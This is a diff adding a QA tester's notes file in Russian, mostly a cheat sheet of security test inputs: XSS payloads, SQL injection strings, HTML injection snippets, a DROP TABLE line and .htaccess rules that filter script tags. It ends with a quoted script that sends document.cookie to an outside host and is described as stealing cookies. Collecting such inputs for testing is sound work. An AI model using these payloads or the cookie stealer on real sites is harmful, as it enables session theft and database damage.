@@ -1,0 +1,99 @@
+Узнать разрешение экрана
+what is my screen resolution
+
+https://mywiki.soft-industry.com/pages/viewpage.action?pageId=98086926&src=jira
+
+
+Валидатор поля E-mail
+/^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/
+
+
+
+Тестирование уязвимости XSS вводм в поля для ввода скрипты
+    <script>alert("cookie: "+document.cookie)</script>
+    "><script>alert("cookie: "+document.cookie)</script>
+    ‘><''>"><script>alert("cookie: "+document.cookie)</script>
+    <body onload=alert(‘xss Уязвимость’)>
+    <img src=javascript:alert(‘Защита от XSS не работает’)>
+    <body background="javascript:alert(‘эй админ закрой xss уязвимости’)" >
+    <style type="text/javascript">alert(‘Бум бум!’);</style>
+
+Защиту от XSS на сервере, прописав в .htaccess такой код:	
+Options +FollowSymLinks
+RewriteEngine On
+RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
+RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]
+RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})
+RewriteRule ^(.*)$ index.php [F,L]
+
+SQL Иньекция
+id=-1+OR+1=1
+
+
+
+Метрики качества
+http://cyberleninka.ru/article/n/metriki-otsenki-kachestva-programmnogo-obespecheniya
+
+
+Валидация полей
+http://ap-test-team.blogspot.com/2011/07/blog-post_16.html
+
+
+
+Security
+SQL иньекции
+
+    Кавычка: '
+    ' OR '1'='1'
+        ' or '1'='1' -- '
+        ' or '1'='1' ({ '
+        ' or '1'='1' /* '
+     !!!Найти!!!
+
+XSS
+
+    http://ha.ckers.org/xss.html
+    <script>alert("xss!")</script>
+    <script>document.getElementByID("...").disabled=true</script>
+    <input onclick="javascript:alert('xss');">
+    <b onmouseover="alert('xss!')">Hello</b>
+
+HTML инъекции
+
+    </body> или </body></body>
+    <textarea />
+    <input></input>
+    <form action="http://live.hh.ru"><input type="submit"></form>
+     !!!Найти!!!
+
+Корректный SQL запрос
+
+    DROP TABLE user;
+    SELECT * FROM blog WHERE code LIKE 'a%';
+
+Корректный Ruby код, Сфинкс
+
+    Найти
+
+Прочее
+
+    Комментарий <!--
+    "${code}";
+    '';!--"<CSS_Check>=&{()}
+
+
+Мы всё время делали коды типа:
+
+<script>alert('HakNet')</script>
+javascript:alert('HakNet')
+javascript:alert('HakNet')/1.jpg и так далие..
+Но они никакой пользы не принесли, это просто коды для проверки(тестировки) на Xss.
+
+Вот скрипт:
+<script>
+img = new Image();
+http://na-s.ru/images/kevmen_2.gif?"+document.cookie;
+</script>
+Он уже ворует куки =)
+
+
